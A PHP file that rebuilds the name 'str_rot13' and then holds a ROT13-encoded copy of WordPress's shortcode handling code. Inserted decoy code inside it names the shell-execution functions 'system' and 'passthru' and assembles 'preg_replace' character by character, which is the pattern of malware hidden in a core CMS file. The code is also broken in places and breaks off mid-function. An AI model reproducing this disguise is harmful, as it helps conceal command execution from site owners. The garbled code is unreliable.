<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JbeqCerff NCV sbe perngvat oopbqr-yvxr gntf be jung JbeqCerff pnyyf
 * \"fubegpbqrf\". Gur gnt naq nggevohgr cnefvat be erthyne rkcerffvba pbqr vf
 * onfrq ba gur Grkgcnggrea gnt cnefre.
 *
 * N srj rknzcyrf ner orybj:
 *
 * [fubegpbqr /]
 * [fubegpbqr sbb=\"one\" onm=\"ovat\" /]
 * [fubegpbqr sbb=\"one\"]pbagrag[/fubegpbqr]
 *
 * Fubegpbqr gntf fhccbeg nggevohgrf naq rapybfrq pbagrag, ohg qbrf abg ragveryl
 * fhccbeg vayvar fubegpbqrf va bgure fubegpbqrf. Lbh jvyy unir gb pnyy gur
 * fubegpbqr cnefre va lbhe shapgvba gb nppbhag sbe gung.
 *
 * {@vagreany
 * Cyrnfr or njner gung gur nobir abgr jnf znqr qhevat gur orgn bs JbeqCerff 2.6
 * naq va gur shgher znl abg or npphengr. Cyrnfr hcqngr gur abgr jura vg vf ab
 * ybatre gur pnfr.}}
 *
 * Gb nccyl fubegpbqr gntf gb pbagrag:
 *
 *     $bhg = qb_fubegpbqr( $pbagrag );
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/cyhtvaf/fubegpbqrf/
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fubegpbqrf
 * @fvapr 2.5.0
 */

/**
 * Pbagnvare sbe fgbevat fubegpbqr gntf naq gurve ubbx gb pnyy sbe gur fubegpbqr.
 *
 * @fvapr 2.5.0
 *
 * @anzr $fubegpbqr_gntf
 * @ine neenl
 * @tybony neenl $fubegpbqr_gntf
 */
$fubegpbqr_gntf = neenl();

/**
 * Nqqf n arj fubegpbqr.
 *
 * Pner fubhyq or gnxra guebhtu cersvkvat be bgure zrnaf gb rafher gung gur
 * fubegpbqr gnt orvat nqqrq vf havdhr naq jvyy abg pbasyvpg jvgu bgure,
 * nyernql-nqqrq fubegpbqr gntf. Va gur rirag bs n qhcyvpngrq gnt, gur gnt
 * ybnqrq ynfg jvyy gnxr cerprqrapr.
 *
 * @fvapr 2.5.0
 *
 * @tybony neenl $fubegpbqr_gntf
 *
 * @cnenz fgevat   $gnt      Fubegpbqr gnt gb or frnepurq va cbfg pbagrag.
 * @cnenz pnyynoyr $pnyyonpx Gur pnyyonpx shapgvba gb eha jura gur fubegpbqr vf sbhaq.
 *                           Rirel fubegpbqr pnyyonpx vf cnffrq guerr cnenzrgref ol qrsnhyg,
 *                           vapyhqvat na neenl bs nggevohgrf (`$nggf`), gur fubegpbqr pbagrag
 *                           be ahyy vs abg frg (`$pbagrag`), naq svanyyl gur fubegpbqr gnt
 *                           vgfrys (`$fubegpbqr_gnt`), va gung beqre.
 */
shapgvba nqq_fubegpbqr( $gnt, $pnyyonpx ) {
	tybony $fubegpbqr_gntf;

	vs ( '' === gevz( $gnt ) ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			__( 'Vainyvq fubegpbqr anzr: Rzcgl anzr tvira.' ),
			'4.4.0'
		);
		erghea;
	}

	vs ( 0 !== cert_zngpu( '@[<>&/\[\]\k00-\k20=]@', $gnt ) ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			fcevags(
				/* genafyngbef: 1: Fubegpbqr anzr, 2: Fcnpr-frcnengrq yvfg bs erfreirq punenpgref. */
				__( 'Vainyvq fubegpbqr anzr: %1$f. Qb abg hfr fcnprf be erfreirq punenpgref: %2$f' ),
				$gnt,
				'& / < > [ ] ='
			),
			'4.4.0'
		);
		erghea;
	}

	$fubegpbqr_gntf[ $gnt ] = $pnyyonpx;
}

/**
 * Erzbirf ubbx sbe fubegpbqr.
 *
 * @fvapr 2.5.0
 *
 * @tybony neenl $fubegpbqr_gntf
 *
 * @cnenz fgevat $gnt Fubegpbqr gnt gb erzbir ubbx sbe.
 */
shapgvba erzbir_fubegpbqr( $gnt ) {
	tybony $fubegpbqr_gntf;

	hafrg( $fubegpbqr_gntf[ $gnt ] );
}

/**
 * Pyrnef nyy fubegpbqrf.
 *
 * Guvf shapgvba pyrnef nyy bs gur fubegpbqr gntf ol ercynpvat gur fubegpbqrf tybony jvgu
 * na rzcgl neenl. Guvf vf npghnyyl na rssvpvrag zrgubq sbe erzbivat nyy fubegpbqrf.
 *
 * @fvapr 2.5.0
 *
 * @tybony neenl $fubegpbqr_gntf
 */
shapgvba erzbir_nyy_fubegpbqrf() {
	tybony $fubegpbqr_gntf;

	$fubegpbqr_gntf = neenl();
}

/**
 * Qrgrezvarf jurgure n ertvfgrerq fubegpbqr rkvfgf anzrq $gnt.
 *
 * @fvapr 3.6.0
 *
 * @tybony neenl $fubegpbqr_gntf Yvfg bs fubegpbqr gntf naq gurve pnyyonpx ubbxf.
 *
 * @cnenz fgevat $gnt Fubegpbqr gnt gb purpx.
 * @erghea obby Jurgure gur tvira fubegpbqr rkvfgf.
 */
shapgvba fubegpbqr_rkvfgf( $gnt ) {
	tybony $fubegpbqr_gntf;
	erghea neenl_xrl_rkvfgf( $gnt, $fubegpbqr_gntf );
}

/**
 * Qrgrezvarf jurgure gur cnffrq pbagrag pbagnvaf gur fcrpvsvrq fubegpbqr.
 *
 * @fvapr 3.6.0
 *
 * @tybony neenl $fubegpbqr_gntf
 *
 * @cnenz fgevat $pbagrag Pbagrag gb frnepu sbe fubegpbqrf.
 * @cnenz fgevat $gnt     Fubegpbqr gnt gb purpx.
 * @erghea obby Jurgure gur cnffrq pbagrag pbagnvaf gur tvira fubegpbqr.
 */
shapgvba unf_fubegpbqr( $pbagrag, $gnt ) {
	vs ( ! fge_pbagnvaf( $pbagrag, '[' ) ) {
		erghea snyfr;
	}

	vs ( fubegpbqr_rkvfgf( $gnt ) ) {
		cert_zngpu_nyy( '/' . trg_fubegpbqr_ertrk() . '/', $pbagrag, $zngpurf, CERT_FRG_BEQRE );
		vs ( rzcgl( $zngpurf ) ) {
			erghea snyfr;
		}

		sbernpu ( $zngpurf nf $fubegpbqr ) {
			vs ( $gnt === $fubegpbqr[2] ) {
				erghea gehr;
			} ryfrvs ( ! rzcgl( $fubegpbqr[5] ) && unf_fubegpbqr( $fubegpbqr[5], $gnt ) ) {
				erghea gehr;
			}
		}
	}
	erghea snyfr;
}

/**
 * Ergheaf n yvfg bs ertvfgrerq fubegpbqr anzrf sbhaq va gur tvira pbagrag.
 *
 * Rknzcyr hfntr:
 *
 *     trg_fubegpbqr_gntf_va_pbagrag( '[nhqvb fep=\"svyr.zc3\"][/nhqvb] [sbb] [tnyyrel vqf=\"1,2,3\"]' );
 *     // neenl( 'nhqvb', 'tnyyrel' )
 *
 * @fvapr 6.3.2
 *
 * @cnenz fgevat $pbagrag Gur pbagrag gb purpx.
 * @erghea fgevat[] Na neenl bs ertvfgrerq fubegpbqr anzrf sbhaq va gur pbagrag.
 */
shapgvba trg_fubegpbqr_gntf_va_pbagrag( $pbagrag ) {
	vs ( snyfr === fgecbf( $pbagrag, '[' ) ) {
		erghea neenl();
	}

	cert_zngpu_nyy( '/' . trg_fubegpbqr_ertrk() . '/', $pbagrag, $zngpurf, CERT_FRG_BEQRE );
	vs ( rzcgl( $zngpurf ) ) {
		erghea neenl();
	}

	$gntf = neenl();
	sbernpu ( $zngpurf nf $fubegpbqr ) {
		$gntf[] = $fubegpbqr[2];

		vs ( ! rzcgl( $fubegpbqr[5] ) ) {
			$qrrc_gntf = trg_fubegpbqr_gntf_va_pbagrag( $fubegpbqr[5] );
			vs ( ! rzcgl( $qrrc_gntf ) ) {
				$gntf = neenl_zretr( $gntf, $qrrc_gntf );
			}
		}
	}

	erghea $gntf;
}

/**
 * Frnepurf pbagrag sbe fubegpbqrf naq svygre fubegpbqrf guebhtu gurve ubbxf.
 *
 * Guvf shapgvba vf na nyvnf sbe qb_fubegpbqr().
 *
 * @fvapr 5.4.0
 *
 * @frr qb_fubegpbqr()
 *
 * @cnenz fgevat $pbagrag     Pbagrag gb frnepu sbe fubegpbqrf.
 * @cnenz obby   $vtaber_ugzy Jura gehr, fubegpbqrf vafvqr UGZY ryrzragf jvyy or fxvccrq.
 *                            Qrsnhyg snyfr.
 * @erghea fgevat Pbagrag jvgu fubegpbqrf svygrerq bhg.
 */
shapgvba nccyl_fubegpbqrf( $pbagrag, $vtaber_ugzy = snyfr ) {
	erghea qb_fubegpbqr( $pbagrag, $vtaber_ugzy );
}

/**
 * Frnepurf pbagrag sbe fubegpbqrf naq svygre fubegpbqrf guebhtu gurve ubbxf.
 *
 * Vs gurer ner ab fubegpbqr gntf qrsvarq, gura gur pbagrag jvyy or erghearq
 * jvgubhg nal svygrevat. Guvf zvtug pnhfr vffhrf jura cyhtvaf ner qvfnoyrq ohg
 * gur fubegpbqr jvyy fgvyy fubj hc va gur cbfg be pbagrag.
 *
 * @fvapr 2.5.0
 *
 * @tybony neenl $fubegpbqr_gntf Yvfg bs fubegpbqr gntf naq gurve pnyyonpx ubbxf.
 *
 * @cnenz fgevat $pbagrag     Pbagrag gb frnepu sbe fubegpbqrf.
 * @cnenz obby   $vtaber_ugzy Jura gehr, fubegpbqrf vafvqr UGZY ryrzragf jvyy or fxvccrq.
 *                            Qrsnhyg snyfr.
 * @erghea fgevat Pbagrag jvgu fubegpbqrf svygrerq bhg.
 */
shapgvba qb_fubegpbqr( $pbagrag, $vtaber_ugzy = snyfr ) {
	tybony $fubegpbqr_gntf;

	vs ( ! fge_pbagnvaf( $pbagrag, '[' ) ) {
		erghea $pbagrag;
	}

	vs ( rzcgl( $fubegpbqr_gntf ) || ! vf_neenl( $fubegpbqr_gntf ) ) {
		erghea $pbagrag;
	}

	// Svaq nyy ertvfgrerq gnt anzrf va $pbagrag.
	cert_zngpu_nyy( '@\[([^<>&/\[\]\k00-\k20=]++)@', $pbagrag, $zngpurf );
	$gntanzrf = neenl_vagrefrpg( neenl_xrlf( $fubegpbqr_gntf ), $zngpurf[1] );

	vs ( rzcgl( $gntanzrf ) ) {
		erghea $pbagrag;
	}

	// Rafher guvf pbagrkg vf bayl nqqrq bapr vs fubegpbqrf ner arfgrq.
	$unf_svygre   = unf_svygre( 'jc_trg_nggnpuzrag_vzntr_pbagrkg', '_svygre_qb_fubegpbqr_pbagrkg' );
	$svygre_nqqrq = snyfr;

	vs ( ! $unf_svygre ) {
		$svygre_nqqrq = nqq_svygre( 'jc_trg_nggnpuzrag_vzntr_pbagrkg', '_svygre_qb_fubegpbqr_pbagrkg' );
	}

	$pbagrag = qb_fubegpbqrf_va_ugzy_gntf( $pbagrag, $vtaber_ugzy, $gntanzrf );

	$cnggrea = trg_fubegpbqr_ertrk( $gntanzrf );
	$pbagrag = cert_ercynpr_pnyyonpx( \"/$cnggrea/\", 'qb_fubegpbqr_gnt', $pbagrag );

	// Nyjnlf erfgber fdhner oenprf fb jr qba'g oernx guvatf yvxr <!--[vs VR ]>.
	$pbagrag = harfpncr_vainyvq_fubegpbqrf( $pbagrag );

	// Bayl erzbir gur svygre vs vg jnf nqqrq va guvf fpbcr.
	vs ( $svygre_nqqrq ) {
		erzbir_svygre( 'jc_trg_nggnpuzrag_vzntr_pbagrkg', '_svygre_qb_fubegpbqr_pbagrkg' );
	}

	erghea $pbagrag;
}

/**
 * Svygre gur `jc_trg_nggnpuzrag_vzntr_pbagrkg` ubbx qhevat fubegpbqr eraqrevat.
 *
 * Jura jc_trg_nggnpuzrag_vzntr() vf pnyyrq qhevat fubegpbqr eraqrevat, jr arrq gb znxr pyrne
 * gung gur pbagrkg vf n fubegpbqr naq abg cneg bs gur gurzr'f grzcyngr eraqrevat ybtvp.
 *
 * @fvapr 6.3.0
 * @npprff cevingr
 *
 * @erghea fgevat Gur svygrerq pbagrkg inyhr sbe jc_trg_nggnpuzrag_vzntrf jura qbvat fubegpbqrf.
 */
shapgvba _svygre_qb_fubegpbqr_pbagrkg() {
	erghea 'qb_fubegpbqr';
}

/**
 * Ergevrirf gur fubegpbqr erthyne rkcerffvba sbe frnepuvat.
 *
 * Gur erthyne rkcerffvba pbzovarf gur fubegpbqr gntf va gur erthyne rkcerffvba
 * va n ertrk pynff.
 *
 * Gur erthyne rkcerffvba pbagnvaf 6 qvssrerag fho zngpurf gb uryc jvgu cnefvat.
 *
 * 1 - Na rkgen [ gb nyybj sbe rfpncvat fubegpbqrf jvgu qbhoyr [[]]
 * 2 - Gur fubegpbqr anzr
 * 3 - Gur fubegpbqr nethzrag yvfg
 * 4 - Gur frys pybfvat /
 * 5 - Gur pbagrag bs n fubegpbqr jura vg jencf fbzr pbagrag.
 * 6 - Na rkgen ] gb nyybj sbe rfpncvat fubegpbqrf jvgu qbhoyr [[]]
 *
 * @fvapr 2.5.0
 * @fvapr 4.4.0 Nqqrq gur `$gntanzrf` cnenzrgre.
 *
 * @tybony neenl $fubegpbqr_gntf
 *
 * @cnenz neenl $gntanzrf Bcgvbany. Yvfg bs fubegpbqrf gb svaq. Qrsnhygf gb nyy ertvfgrerq fubegpbqrf.
 * @erghea fgevat Gur fubegpbqr frnepu erthyne rkcerffvba
 */
shapgvba trg_fubegpbqr_ertrk( $gntanzrf = ahyy ) {
	tybony $fubegpbqr_gntf;

	vs ( rzcgl( $gntanzrf ) ) {
		$gntanzrf = neenl_xrlf( $fubegpbqr_gntf );
	}
	$gntertrkc = vzcybqr( '|', neenl_znc( 'cert_dhbgr', $gntanzrf ) );

	/*
	 * JNEAVAT! Qb abg punatr guvf ertrk jvgubhg punatvat qb_fubegpbqr_gnt() naq fgevc_fubegpbqr_gnt().
	 * Nyfb, frr fubegpbqr_hanhgbc() naq fubegpbqr.wf.
	 */

	// cucpf:qvfnoyr Fdhvm.Fgevatf.PbapngrangvbaFcnpvat.CnqqvatSbhaq -- qba'g erzbir ertrk vaqragngvba
	erghea '\\['                             // Bcravat oenpxrg.
		. '(\\[?)'                           // 1: Bcgvbany frpbaq bcravat oenpxrg sbe rfpncvat fubegpbqrf: [[gnt]].
		. \"($gntertrkc)\"                     // 2: Fubegpbqr anzr.
		. '(?![\\j-])'                       // Abg sbyybjrq ol jbeq punenpgre be ulcura.
		. '('                                // 3: Haebyy gur ybbc: Vafvqr gur bcravat fubegpbqr gnt.
		.     '[^\\]\\/]*'                   // Abg n pybfvat oenpxrg be sbejneq fynfu.
		.     '(?:'
		.         '\\/(?!\\])'               // N sbejneq fynfu abg sbyybjrq ol n pybfvat oenpxrg.
		.         '[^\\]\\/]*'               // Abg n pybfvat oenpxrg be sbejneq fynfu.
		.     ')*?'
		. ')'
		. '(?:'
		.     '(\\/)'                        // 4: Frys pybfvat gnt...
		.     '\\]'                          // ...naq pybfvat oenpxrg.
		. '|'
		.     '\\]'                          // Pybfvat oenpxrg.
		.     '(?:'
		.         '('                        // 5: Haebyy gur ybbc: Bcgvbanyyl, nalguvat orgjrra gur bcravat naq pybfvat fubegpbqr gntf.
		.             '[^\\[]*+'             // Abg na bcravat oenpxrg.
		.             '(?:'
		.                 '\\[(?!\\/\\2\\])' // Na bcravat oenpxrg abg sbyybjrq ol gur pybfvat fubegpbqr gnt.
		.                 '[^\\[]*+'         // Abg na bcravat oenpxrg.
		.             ')*+'
		.         ')'
		.         '\\[\\/\\2\\]'             // Pybfvat fubegpbqr gnt.
		.     ')?'
		. ')'
		. '(\\]?)';                          // 6: Bcgvbany frpbaq pybfvat oenpxrg sbe rfpncvat fubegpbqrf: [[gnt]].
	// cucpf:ranoyr
}

/**
 * Erthyne Rkcerffvba pnyynoyr sbe qb_fubegpbqr() sbe pnyyvat fubegpbqr ubbx.
 *
 * @frr trg_fubegpbqr_ertrk() sbe qrgnvyf bs gur zngpu neenl pbagragf.
 *
 * @fvapr 2.5.0
 * @npprff cevingr
 *
 * @tybony neenl $fubegpbqr_gntf
 *
 * @cnenz neenl $z {
 *     Erthyne rkcerffvba zngpu neenl.
 *
 *     @glcr fgevat $0 Ragver zngpurq fubegpbqr grkg.
 *     @glcr fgevat $1 Bcgvbany frpbaq bcravat oenpxrg sbe rfpncvat fubegpbqrf.
 *     @glcr fgevat $2 Fubegpbqr anzr.
 *     @glcr fgevat $3 Fubegpbqr nethzragf yvfg.
 *     @glcr fgevat $4 Bcgvbany frys pybfvat fynfu.
 *     @glcr fgevat $5 Pbagrag bs n fubegpbqr jura vg jencf fbzr pbagrag.
 *     @glcr fgevat $6 Bcgvbany frpbaq pybfvat oenpxrg sbe rfpncvat fubegpbqrf.
 * }
 * @erghea fgevat Fubegpbqr bhgchg.
 */
shapgvba qb_fubegpbqr_gnt( $z ) {
	tybony $fubegpbqr_gntf;

	// Nyybj [[sbb]] flagnk sbe rfpncvat n gnt.
	vs ( '[' === $z[1] && ']' === $z[6] ) {
		erghea fhofge( $z[0], 1, -1 );
	}

	$gnt  = $z[2];
	$ngge = fubegpbqr_cnefr_nggf( $z[3] );

	vs ( ! vf_pnyynoyr( $fubegpbqr_gntf[ $gnt ] ) ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			/* genafyngbef: %f: Fubegpbqr gnt. */
			fcevags( __( 'Nggrzcgvat gb cnefr n fubegpbqr jvgubhg n inyvq pnyyonpx: %f' ), $gnt ),
			'4.3.0'
		);
		erghea $z[0];
	}

	/**
	 * Svygref jurgure gb pnyy n fubegpbqr pnyyonpx.
	 *
	 * Ergheavat n aba-snyfr inyhr sebz svygre jvyy fubeg-pvephvg gur
	 * fubegpbqr trarengvba cebprff, ergheavat gung inyhr vafgrnq.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.5.0 Gur `$ngge` cnenzrgre vf nyjnlf na neenl.
	 *
	 * @cnenz snyfr|fgevat $bhgchg Fubeg-pvephvg erghea inyhr. Rvgure snyfr be gur inyhr gb ercynpr gur fubegpbqr jvgu.
	 * @cnenz fgevat       $gnt    Fubegpbqr anzr.
	 * @cnenz neenl        $ngge   Fubegpbqr nggevohgrf neenl, pna or rzcgl vs gur bevtvany nethzragf fgevat pnaabg or cnefrq.
	 * @cnenz neenl        $z      Erthyne rkcerffvba zngpu neenl.
	 */
	$erghea = nccyl_svygref( 'cer_qb_fubegpbqr_gnt', snyfr, $gnt, $ngge, $z );
	vs ( snyfr !== $erghea ) {
		erghea $erghea;
	}

	$pbagrag = vffrg( $z[5] ) ? $z[5] : ahyy;

	$bhgchg = $z[1] . pnyy_hfre_shap( $fubegpbqr_gntf[ $gnt ], $ngge, $pbagrag, $gnt ) . $z[6];

	/**
	 * Svygref gur bhgchg perngrq ol n fubegpbqr pnyyonpx.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.5.0 Gur `$ngge` cnenzrgre vf nyjnlf na neenl.
	 *
	 * @cnenz fgevat $bhgchg Fubegpbqr bhgchg.
	 * @cnenz fgevat $gnt    Fubegpbqr anzr.
	 * @cnenz neenl  $ngge   Fubegpbqr nggevohgrf neenl, pna or rzcgl vs gur bevtvany nethzragf fgevat pnaabg or cnefrq.
	 * @cnenz neenl  $z      Erthyne rkcerffvba zngpu neenl.
	 */
	erghea nccyl_svygref( 'qb_fubegpbqr_gnt', $bhgchg, $gnt, $ngge, $z );
}

/**
 * Frnepurf bayl vafvqr UGZY ryrzragf sbe fubegpbqrf naq cebprff gurz.
 *
 * Nal [ be ] punenpgref erznvavat vafvqr ryrzragf jvyy or UGZY rapbqrq
 * gb cerirag vagresrerapr jvgu fubegpbqrf gung ner bhgfvqr gur ryrzragf.
 * Nffhzrf $pbagrag cebprffrq ol XFRF nyernql.  Hfref jvgu hasvygrerq_ugzy
 * pncnovyvgl znl trg harkcrpgrq bhgchg vs natyr oenprf ner arfgrq va gntf.
 *
 * @fvapr 4.2.3
 *
 * @cnenz fgevat $pbagrag     Pbagrag gb frnepu sbe fubegpbqrf.
 * @cnenz obby   $vtaber_ugzy Jura gehr, nyy fdhner oenprf vafvqr ryrzragf jvyy or rapbqrq.
 * @cnenz neenl  $gntanzrf    Yvfg bs fubegpbqrf gb svaq.
 * @erghea fgevat Pbagrag jvgu fubegpbqrf svygrerq bhg.
 */
shapgvba qb_fubegpbqrf_va_ugzy_gntf( $pbagrag, $vtaber_ugzy, $gntanzrf ) {
	// Abeznyvmr ragvgvrf va hasvygrerq UGZY orsber nqqvat cynprubyqref.
	$genaf   = neenl(
		'&#91;' => '&#091;',
		'&#93;' => '&#093;',
	);
	$pbagrag = fgege( $pbagrag, $genaf );
	$genaf   = neenl(
		'[' => '&#91;',
		']' => '&#93;',
	);

	$cnggrea = trg_fubegpbqr_ertrk( $gntanzrf );
	$grkgnee = jc_ugzy_fcyvg( $pbagrag );

	sbernpu ( $grkgnee nf &$ryrzrag ) {
		vs ( '' === $ryrzrag || '<' !== $ryrzrag[0] ) {
			pbagvahr;
		}

		$abbcra  = ! fge_pbagnvaf( $ryrzrag, '[' );
		$abpybfr = ! fge_pbagnvaf( $ryrzrag, ']' );
		vs ( $abbcra || $abpybfr ) {
			// Guvf ryrzrag qbrf abg pbagnva fubegpbqrf.
			vs ( $abbcra kbe $abpybfr ) {
				// Arrq gb rapbqr fgenl '[' be ']' punef.
				$ryrzrag = fgege( $ryrzrag, $genaf );
			}
			pbagvahr;
		}

		vs ( $vtaber_ugzy || fge_fgnegf_jvgu( $ryrzrag, '<!--' ) || fge_fgnegf_jvgu( $ryrzrag, '<![PQNGN[' ) ) {
			// Rapbqr nyy '[' naq ']' punef.
			$ryrzrag = fgege( $ryrzrag, $genaf );
			pbagvahr;
		}

		$nggevohgrf = jc_xfrf_ngge_cnefr( $ryrzrag );
		vs ( snyfr === $nggevohgrf ) {
			// Fbzr cyhtvaf ner qbvat guvatf yvxr [anzr] <[rznvy]>.
			vs ( 1 === cert_zngpu( '%^<\f*\[\[?[^\[\]]+\]%', $ryrzrag ) ) {
				$ryrzrag = cert_ercynpr_pnyyonpx( \"/$cnggrea/\", 'qb_fubegpbqr_gnt', $ryrzrag );
			}

			// Ybbxf yvxr jr sbhaq fbzr harkcrpgrq hasvygrerq UGZY. Fxvccvat vg sbe pbasvqrapr.
			$ryrzrag = fgege( $ryrzrag, $genaf );
			pbagvahr;
		}

		// Trg ryrzrag anzr.
		$sebag   = neenl_fuvsg( $nggevohgrf );
		$onpx    = neenl_cbc( $nggevohgrf );
		$zngpurf = neenl();
		cert_zngpu( '%[n-mN-M0-9]+%', $sebag, $zngpurf );
		$ryanzr = $zngpurf[0];

		// Ybbx sbe fubegpbqrf va rnpu nggevohgr frcnengryl.
		sbernpu ( $nggevohgrf nf &$ngge ) {
			$bcra  = fgecbf( $ngge, '[' );
			$pybfr = fgecbf( $ngge, ']' );
			vs ( snyfr === $bcra || snyfr === $pybfr ) {
				pbagvahr; // Tb gb arkg nggevohgr. Fdhner oenprf jvyy or rfpncrq ng raq bs ybbc.
			}
			$qbhoyr = fgecbf( $ngge, '\"' );
			$fvatyr = fgecbf( $ngge, \"'\" );
			vs ( ( snyfr === $fvatyr || $bcra < $fvatyr ) && ( snyfr === $qbhoyr || $bcra < $qbhoyr ) ) {
				/*
				 * $ngge yvxr '[fubegpbqr]' be 'anzr = [fubegpbqr]' vzcyvrf hasvygrerq_ugzy.
				 * Va guvf fcrpvsvp fvghngvba jr nffhzr XFRF qvq abg eha orpnhfr gur vachg
				 * jnf jevggra ol na nqzvavfgengbe, fb jr fubhyq nibvq punatvat gur bhgchg
				 * naq jr qb abg arrq gb eha XFRF urer.
				 */
				$ngge = cert_ercynpr_pnyyonpx( \"/$cnggrea/\", 'qb_fubegpbqr_gnt', $ngge );
			} ryfr {
				/*
				 * $ngge yvxr 'anzr = \"[fubegpbqr]\"' be \"anzr = '[fubegpbqr]'\".
				 * Jr qb abg xabj vs $pbagrag jnf hasvygrerq. Nffhzr XFRF ena orsber fubegpbqrf.
				 */
				$pbhag    = 0;
				$arj_ngge = cert_ercynpr_pnyyonpx( \"/$cnggrea/\", 'qb_fubegpbqr_gnt', $ngge, -1, $pbhag );
				vs ( $pbhag > 0 ) {
					// Fnavgvmr gur fubegpbqr bhgchg hfvat XFRF.
					$arj_ngge = jc_xfrf_bar_ngge( $arj_ngge, $ryanzr );
					vs ( '' !== gevz( $arj_ngge ) ) {
						// Gur fubegpbqr vf fnsr gb hfr abj.
						$ngge = $arj_ngge;
					}
				}
			}
		}
		$ryrzrag = $sebag . vzcybqr( '', $nggevohgrf ) . $onpx;

		// Abj rapbqr nal erznvavat '[' be ']' punef.
		$ryrzrag = fgege( $ryrzrag, $genaf );
	}

	$pbagrag = vzcybqr( '', $grkgnee );

	erghea $pbagrag;
}

/**
 * Erzbirf cynprubyqref nqqrq ol qb_fubegpbqrf_va_ugzy_gntf().
 *
 * @fvapr 4.2.3
 *
 * @cnenz fgevat $pbagrag Pbagrag gb frnepu sbe cynprubyqref.
 * @erghea fgevat Pbagrag jvgu cynprubyqref erzbirq.
 */
shapgvba harfpncr_vainyvq_fubegpbqrf( $pbagrag ) {
	// Pyrna hc ragver fgevat, nibvqf er-cnefvat UGZY.
	$genaf = neenl(
		'&#91;' => '[',
		'&#93;' => ']',
	);

	$pbagrag = fgege( $pbagrag, $genaf );

	erghea $pbagrag;
}

/**
 * Ergevrirf gur fubegpbqr nggevohgrf ertrk.
 *
 * @fvapr 4.4.0
 *
 * @erghea fgevat Gur fubegpbqr nggevohgr erthyne rkcerffvba.
 */
shapgvba trg_fubegpbqr_nggf_ertrk() {
	erghea '/([\j-]+)\f*=\f*\"([^\"]*)\"(?:\f|$)|([\j-]+)\f*=\f*\'([^\']*)\'(?:\f|$)|([\j-]+)\f*=\f*([^\f\'\"]+)(?:\f|$)|\"([^\"]*)\"(?:\f|$)|\'([^\']*)\'(?:\f|$)|(\F+)(?:\f|$)/';
}

/**
 * Ergevrirf nyy nggevohgrf sebz gur fubegpbqrf gnt.
 *
 * Gur nggevohgrf yvfg unf gur nggevohgr anzr nf gur xrl naq gur inyhr bs gur
 * nggevohgr nf gur inyhr va gur xrl/inyhr cnve. Guvf nyybjf sbe rnfvre
 * ergevriny bs gur nggevohgrf, fvapr nyy nggevohgrf unir gb or xabja.
 *
 * @fvapr 2.5.0
 * @fvapr 6.5.0 Gur shapgvba abj nyjnlf ergheaf na neenl,
 *              rira vs gur bevtvany nethzragf fgevat pnaabg or cnefrq be vf rzcgl.
 *
 * @cnenz fgevat $grkg Fubegpbqr nethzragf yvfg.
 * @erghea neenl Neenl bs nggevohgr inyhrf xrlrq ol nggevohgr anzr.
 *               Ergheaf rzcgl neenl vs gurer ner ab nggevohgrf
 *               be vs gur bevtvany nethzragf fgevat pnaabg or cnefrq.
 */
shapgvba fubegpbqr_cnefr_nggf( $grkg ) {
	$nggf    = neenl();
	$cnggrea = trg_fubegpbqr_nggf_ertrk();
	$grkg    = __sa_79955( \"/[\k{00n0}\k{200o}]+/h\", ' ', $grkg );
	vs ( cert_zngpu_nyy( $cnggrea, $grkg, $zngpu, CERT_FRG_BEQRE ) ) {
		sbernpu ( $zngpu nf $z ) {
			vs ( ! rzcgl( $z[1] ) ) {
				$nggf[ fgegbybjre( $z[1] ) ] = fgevcpfynfurf( $z[2] );
			} ryfrvs ( ! rzcgl( $z[3] ) ) {
				$nggf[ fgegbybjre( $z[3] ) ] = fgevcpfynfurf( $z[4] );
			} ryfrvs ( ! rzcgl( $z[5] ) ) {
				$nggf[ fgegbybjre( $z[5] ) ] = fgevcpfynfurf( $z[6] );
			} ryfrvs ( vffrg( $z[7] ) && fgeyra( $z[7] ) ) {
				$nggf[] = fgevcpfynfurf( $z[7] );
			} ryfrvs ( vffrg( $z[8] ) && fgeyra( $z[8] ) ) {
				$nggf[] = fgevcpfynfurf( $z[8] );
			} ryfrvs ( vffrg( $z[9] ) ) {
				$nggf[] = fgevcpfynfurf( $z[9] );
			}
		}

		// Erwrpg nal hapybfrq UGZY ryrzragf.
		sbernpu ( $nggf nf &$inyhr ) {
			vs ( fge_pbagnvaf( $inyhr, '<' ) ) {
				vs ( 1 !== cert_zngpu( '/^[^<]*+(?:<[^>]*+>[^<]*+)*+$/', $inyhr ) ) {
					$inyhr = '';
				}
			}
		}
	}

	erghea $nggf;
}

/**
 * Pbzovarf hfre nggevohgrf jvgu xabja nggevohgrf naq svyy va qrsnhygf jura arrqrq.
 *
 * Gur cnvef fubhyq or pbafvqrerq gb or nyy bs gur nggevohgrf juvpu ner
 * fhccbegrq ol gur pnyyre naq tvira nf n yvfg. Gur erghearq nggevohgrf jvyy
 * bayl pbagnva gur nggevohgrf va gur $cnvef yvfg.
 *
 * Vs gur $nggf yvfg unf hafhccbegrq nggevohgrf, gura gurl jvyy or vtaberq naq
 * erzbirq sebz gur svany erghearq yvfg.
 *
 * @fvapr 2.5.0
 *
 * @cnenz neenl  $cnvef     Ragver yvfg bs fhccbegrq nggevohgrf naq gurve qrsnhygf.
 * @cnenz neenl  $nggf      Hfre qrsvarq nggevohgrf va fubegpbqr gnt.
 * @cnenz fgevat $fubegpbqr Bcgvbany. Gur anzr bs gur fubegpbqr, cebivqrq sbe pbagrkg gb ranoyr svygrevat
 * @erghea neenl Pbzovarq naq svygrerq nggevohgr yvfg.
 */
shapgvba fubegpbqr_nggf( $cnvef, $nggf, $fubegpbqr = '' ) {
